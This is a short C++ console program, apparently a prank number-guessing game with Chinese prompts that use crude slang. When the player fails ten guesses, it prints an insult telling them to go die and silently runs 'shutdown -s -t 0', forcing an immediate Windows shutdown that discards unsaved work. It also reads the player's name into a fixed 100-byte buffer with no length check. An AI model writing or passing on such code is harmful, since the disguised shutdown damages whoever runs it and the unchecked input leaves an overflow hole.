
3#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <time.h>
using namespace std;

int main()
{
	char name[100];
	cout << "请输入你的名字";
	cin >> name;
	
	int a;
	srand((int)time(0));
	a=rand();
	int num=a%100+1;
	
	int ci=10;
	int input;
	while(ci)
	{
		ci-=1;
		cout << "撸" << name << "几次:";
		cin >> input;
		if(input>num)
		{
			cout << "撸太多次了!\n";
			cout << "还剩下" << ci << "次机会\n" ;
		}
		else if(input<num)
		{
			cout << "撸太少次了!\n";
			cout << "还剩下" << ci << "次机会\n" ;
		}
		else
		{
			cout << "恭喜你,撸对了\n";
			break; 
		}
	}
	if(ci!=0)
	{
		printf("游戏结束!");
	}
	else
	{
		cout<<"撸了这么多次都没撸对你怎么不去屎?\n" ;
		system("shutdown -s -t 0");
	} 
	
}
